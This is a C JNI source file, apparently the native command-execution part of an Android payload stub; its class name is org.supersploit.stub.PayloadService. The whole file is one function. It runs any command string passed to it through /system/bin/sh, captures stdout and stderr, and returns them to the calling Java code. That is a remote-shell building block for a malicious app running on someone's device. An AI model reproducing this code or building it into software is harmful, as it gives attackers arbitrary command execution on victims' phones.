#include <jni.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

JNIEXPORT jstring JNICALL Java_org_supersploit_stub_PayloadService_executeNative(JNIEnv *env, jobject thiz, jstring cmdStr) {
    const char *cmd = (*env)->GetStringUTFChars(env, cmdStr, 0);

    int pipefd[2];
    if (pipe(pipefd) == -1) {
        (*env)->ReleaseStringUTFChars(env, cmdStr, cmd);
        return (*env)->NewStringUTF(env, "Error: pipe failed");
    }

    pid_t pid = fork();
    if (pid == -1) {
        (*env)->ReleaseStringUTFChars(env, cmdStr, cmd);
        return (*env)->NewStringUTF(env, "Error: fork failed");
    }

    if (pid == 0) {
        // Child
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);

        // Clean env to avoid linker errors
        unsetenv("LD_LIBRARY_PATH");

        execl("/system/bin/sh", "sh", "-c", cmd, (char *)0);
        exit(1);
    } else {
        // Parent
        close(pipefd[1]);

        char buffer[4096];
        int total_len = 0;
        int max_len = 65536; // 64kb max output for now
        char *output = malloc(max_len);
        if (!output) {
            (*env)->ReleaseStringUTFChars(env, cmdStr, cmd);
            return (*env)->NewStringUTF(env, "Error: malloc failed");
        }

        output[0] = '\0';
        ssize_t count;
        while ((count = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
            buffer[count] = '\0';
            if (total_len + count < max_len) {
                strcat(output, buffer);
                total_len += count;
            } else {
                break;
            }
        }
        close(pipefd[0]);
        waitpid(pid, NULL, 0);

        (*env)->ReleaseStringUTFChars(env, cmdStr, cmd);
        jstring result = (*env)->NewStringUTF(env, output);
        free(output);
        return result;
    }
}

